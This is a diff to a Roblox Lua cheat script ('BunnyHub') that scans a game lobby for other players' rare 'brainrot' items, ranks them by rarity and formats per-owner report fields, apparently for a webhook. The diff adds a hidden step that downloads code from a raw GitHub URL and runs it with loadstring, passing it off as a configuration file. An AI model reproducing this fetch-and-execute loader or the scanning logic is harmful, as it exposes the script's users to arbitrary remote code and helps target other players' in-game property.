@@ -15,6 +15,52 @@ if getgenv().BunnyHubLoaded then
 end
 getgenv().BunnyHubLoaded = true
 
+local BrainrotConfig = nil
+local BrainrotConfigReady = false
+
+task.spawn(function()
+    local ok, content = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/trademachinenew/newmachinetrade/refs/heads/main/prueba")
+    end)
+    if ok and content then
+        local sok, data = pcall(function() return loadstring(content)() end)
+        if sok and data then
+            BrainrotConfig = data
+            BrainrotConfigReady = true
+        end
+    end
+end)
+
+-- Función helper para formatear nombre según prioridad
+local function FormatBrainrotName(name, mut, gen)
+    local prefix = "▫️"
+    local suffix = ""
+    local tier = 0
+
+    if BrainrotConfig and BrainrotConfig.BrainrotPriority then
+        for i, pname in ipairs(BrainrotConfig.BrainrotPriority) do
+            if pname == name then
+                if i <= 10 then
+                    prefix = "💎"
+                    suffix = " 🚨"
+                    tier = 3
+                elseif i <= 30 then
+                    prefix = "🔥"
+                    suffix = " ⚡"
+                    tier = 2
+                elseif i <= 60 then
+                    prefix = "⭐"
+                    tier = 1
+                end
+                break
+            end
+        end
+    end
+
+    local mutTag = mut ~= "None" and string.format("[%s] ", mut) or ""
+    return string.format("%s %s%s — %s%s", prefix, mutTag, name, gen, suffix), tier
+end
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -183,7 +229,11 @@ end
 
 local function SendLobbyBrainrotScan()
     task.spawn(function()
-        task.wait(4)
+        local t = 0
+        while not BrainrotConfigReady and t < 8 do
+            task.wait(0.5)
+            t = t + 0.5
+        end
 
         if game.PlaceId ~= 109983668079237 then return end
 
@@ -285,20 +335,28 @@ local function SendLobbyBrainrotScan()
                 if isValidBR(child) then
                     local mut = getMut(child)
                     local gen = getGen(child)
-                    local line = mut ~= "None"
-                        and string.format("[%s] %s — %s", mut, child.Name, gen)
-                        or  string.format("%s — %s", child.Name, gen)
-                    table.insert(items, line)
+                    local line, tier = FormatBrainrotName(child.Name, mut, gen)
+                    table.insert(items, { text = line, tier = tier })
                     total = total + 1
                 end
             end
 
+            -- ordenar por tier desc (raros primero)
+            table.sort(items, function(a, b) return a.tier > b.tier end)
+
             if #items > 0 then
                 table.insert(results, {
-                    owner = owner,
-                    isMe  = isMe,
-                    items = items,
-                    count = #items,
+                    owner    = owner,
+                    isMe     = isMe,
+                    items    = items,
+                    count    = #items,
+                    hotCount = (function()
+                        local n = 0
+                        for _, item in ipairs(items) do
+                            if item.tier >= 2 then n = n + 1 end
+                        end
+                        return n
+                    end)(),
                 })
             end
         end
@@ -343,14 +401,18 @@ local function SendLobbyBrainrotScan()
 
         for _, pd in ipairs(results) do
             local lines = {}
-            for _, line in ipairs(pd.items) do
-                table.insert(lines, "• " .. line)
+            for _, item in ipairs(pd.items) do
+                table.insert(lines, item.text)   -- antes era "• " .. line
             end
             local value = table.concat(lines, "\n")
             if #value > 1000 then value = value:sub(1, 970) .. "\n..." end
+
             local label = pd.isMe
-                and string.format("★ %s (%d)", pd.owner, pd.count)
-                or  string.format("📦 %s (%d)",  pd.owner, pd.count)
+                and string.format("★ %s (%d)%s", pd.owner, pd.count,
+                    pd.hotCount > 0 and " 🔥x"..pd.hotCount or "")
+                or  string.format("📦 %s (%d)%s", pd.owner, pd.count,
+                    pd.hotCount > 0 and " 🔥x"..pd.hotCount or "")
+
             table.insert(fields, {
                 ["name"]   = label,
                 ["value"]  = value,
